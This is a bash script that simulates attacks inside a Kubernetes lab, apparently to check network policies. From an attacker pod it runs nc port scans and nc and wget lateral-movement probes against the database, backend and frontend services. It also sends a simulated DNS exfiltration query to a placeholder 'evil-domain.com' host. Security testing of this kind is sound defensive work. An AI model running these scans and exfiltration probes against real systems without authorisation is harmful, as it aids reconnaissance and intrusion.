#!/bin/bash

echo "============================================"
echo "        ATTACK SIMULATION REPORT"
echo "============================================"
echo "Date: $(date)"
echo ""

BACKEND_IP=$(kubectl get service backend-service -n backend -o jsonpath='{.spec.clusterIP}')
DATABASE_IP=$(kubectl get service database-service -n database -o jsonpath='{.spec.clusterIP}')
FRONTEND_IP=$(kubectl get service frontend-service -n frontend -o jsonpath='{.spec.clusterIP}')

echo "Attack 1: Port Scan on Backend (port 80)"
kubectl exec -n attacker attacker-pod -- sh -c "nc -w 2 -zv $BACKEND_IP 80 2>&1" && \
  echo "Result: OPEN" || echo "Result: BLOCKED"

echo ""
echo "Attack 2: Port Scan on Database (port 3306)"
kubectl exec -n attacker attacker-pod -- sh -c "nc -w 2 -zv $DATABASE_IP 3306 2>&1" && \
  echo "Result: OPEN - DANGER" || echo "Result: BLOCKED"

echo ""
echo "Attack 3: Lateral Movement to Database"
kubectl exec -n attacker attacker-pod -- sh -c "nc -w 3 $DATABASE_IP 3306 2>&1" && \
  echo "Result: LATERAL MOVEMENT SUCCEEDED" || echo "Result: BLOCKED"

echo ""
echo "Attack 4: Lateral Movement to Backend"
kubectl exec -n attacker attacker-pod -- sh -c "wget -qO- --timeout=5 http://$BACKEND_IP 2>&1" && \
  echo "Result: ATTACKER REACHED BACKEND" || echo "Result: BLOCKED"

echo ""
echo "Attack 5: Lateral Movement to Frontend"
kubectl exec -n attacker attacker-pod -- sh -c "wget -qO- --timeout=5 http://$FRONTEND_IP 2>&1" && \
  echo "Result: ATTACKER REACHED FRONTEND" || echo "Result: BLOCKED"

echo ""
echo "Attack 6: DNS Exfiltration Simulation"
kubectl exec -n attacker attacker-pod -- sh -c "nslookup google.com 2>&1" && \
  echo "Result: DNS works (expected)" || echo "Result: DNS blocked"

echo ""
echo "Attack 7: Suspicious DNS Query"
kubectl exec -n attacker attacker-pod -- sh -c \
  "nslookup sensitive-data.evil-domain.com 2>&1" && \
  echo "Result: WARNING - DNS exfiltration possible" || \
  echo "Result: Suspicious DNS query failed"

echo ""
echo "============================================"
echo "         ATTACK SIMULATION COMPLETE"
echo "============================================"
